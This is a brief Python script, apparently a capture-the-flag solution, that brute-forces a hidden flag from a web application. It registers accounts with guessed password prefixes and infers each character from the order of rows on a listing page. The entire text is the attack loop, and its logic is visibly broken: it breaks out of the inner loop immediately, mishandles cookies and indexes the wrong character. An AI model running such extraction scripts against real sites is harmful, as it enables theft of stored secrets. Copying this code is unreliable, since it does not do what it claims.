import requests
url=input()
cookie=input()
param=input()
str='-0123456789abcdefghijklmnopqrstuvwxyz{|}'
flag=""
for i in range(48):
    for j in range(0,len(str)):
        index=flag+str[j]
        data={
            'username':'123',
            'email':123,
            'nickname':'123',
            'password':index
        }
        t=requests.post(url,data=data,timeout=1)
        t=requests.get(url,params=param,cookies=cookie,timeout=1).text
        if t.find(f"<td>{flag}</td>")>t.find("<td>flag</td>"):
            flag=flag+str[j-1]
            print(flag)
        break
